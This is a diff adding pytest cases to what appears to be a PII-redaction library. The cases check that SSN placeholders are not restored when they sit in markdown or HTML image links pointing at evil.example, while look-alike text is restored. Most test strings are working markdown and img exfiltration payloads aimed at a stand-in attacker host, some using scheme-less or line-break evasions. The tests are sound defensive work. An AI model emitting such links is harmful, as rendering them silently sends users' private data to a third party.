@@ -112,3 +112,39 @@ def test_llamaindex_delta_sees_earlier_text():
     deltas = "".join(r.delta for r in out) + (extra.delta if extra else "")
     assert deltas == "![x](https://evil.example/?d=<SSN_1>) and bob@example.com"
     assert out[-1].message.content == deltas
+
+
+# Addresses without a scheme, and link targets that start on the next line
+# ---------------------------------------------------------------------------
+@pytest.mark.parametrize("text", [
+    "![x](\n//evil.example/?d=<SSN_1>)",
+    "![x](\n  https://evil.example/a?q=1 <SSN_1>)",
+    "![x][r]\n\n[r]: //evil.example/?d=<SSN_1>",
+    "[r]: <//evil.example/?d=<SSN_1>>",
+    "[r]: /\\evil.example/?<SSN_1>",
+    '<img src=\n"//evil.example/<SSN_1>">',
+    '<img src=\n"https://evil.example/a b/<SSN_1>">',
+    "<img src=//evil.example/<SSN_1>>",
+    "<img src=\\\\evil.example\\<SSN_1>>",
+    "![x](\n/\\evil.example/?<SSN_1>)",
+])
+def test_schemeless_and_next_line_addresses_keep_placeholder(text):
+    m = _map()
+    assert m.restore_text(text) == text
+    assert "234-12-1234" not in m.restore_text(text)
+
+
+@pytest.mark.parametrize("text", [
+    "// <SSN_1> is the id",
+    "a / b // <SSN_1>",
+    "ratio 1//2 and <SSN_1>",
+    "x = \"<SSN_1>\"",
+    "data = <SSN_1>",
+    "The src=<SSN_1> part",
+    "![x](https://ok.example/a.png)\n\nYour SSN is <SSN_1>",
+    "[docs](https://ok.example/a\n\nSSN: <SSN_1>",
+    "(\n<SSN_1>\n)",
+])
+def test_text_that_only_looks_like_an_address_is_restored(text):
+    m = _map()
+    assert m.restore_text(text) == text.replace("<SSN_1>", "234-12-1234")
